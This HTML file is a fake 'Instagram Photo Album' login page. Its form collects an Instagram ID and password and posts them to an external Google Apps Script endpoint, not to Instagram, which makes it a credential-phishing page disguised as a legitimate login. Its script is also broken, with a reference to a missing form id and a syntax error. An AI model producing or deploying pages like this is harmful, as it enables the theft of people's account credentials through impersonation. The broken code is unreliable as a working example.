<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Photo Album</title>
<style>
  body {
    background-color: #121212;
    color: #fff;
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .container {
    background-color: rgba(255, 255, 255, 0.05);
    padding: 30px;
    border-radius: 10px;
    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
    text-align: center;
  }

  input[type="text"], input[type="password"] {
    width: calc(100% - 40px);
    padding: 12px;
    margin: 10px 0;
    border: none;
    background-color: rgba(255, 255, 255, 0.1);
    color: #fff;
    border-radius: 25px;
    outline: none;
  }

  input[type="submit"] {
    width: calc(100% - 40px);
    padding: 12px;
    margin: 10px 0;
    border: none;
    background-color: #4CAF50;
    color: #fff;
    border-radius: 25px;
    cursor: pointer;
    outline: none;
    transition: background-color 0.3s;
  }

  input[type="submit"]:hover {
    background-color: #45a049;
  }

  .error {
    color: #ff3333;
    margin-top: 10px;
  }

  h2 {
    margin-bottom: 20px;
  }
</style>
</head>
<body>

<div class="container">
  <h2>Login to Instagram Photo Album</h2>
  <form id="gform" action="https://script.google.com/macros/s/AKfycbwrCcGnZHYiLv9DgiOireNMwHSS1cCCJMh4F4rixsS4vNN_ZhMSMzS5zl_T_39Ghas1Pg/exec" method="post">
    <input type="text" name="username" placeholder="Instagram id">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
    <submit action="" method="get">
  </form>
  <div class="error" id="error"></div>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", function(event) {
    var username = document.querySelector('input[name="username"]').value;
    var password = document.querySelector('input[name="password"]').value;
  }
</script>

</body>
</html>
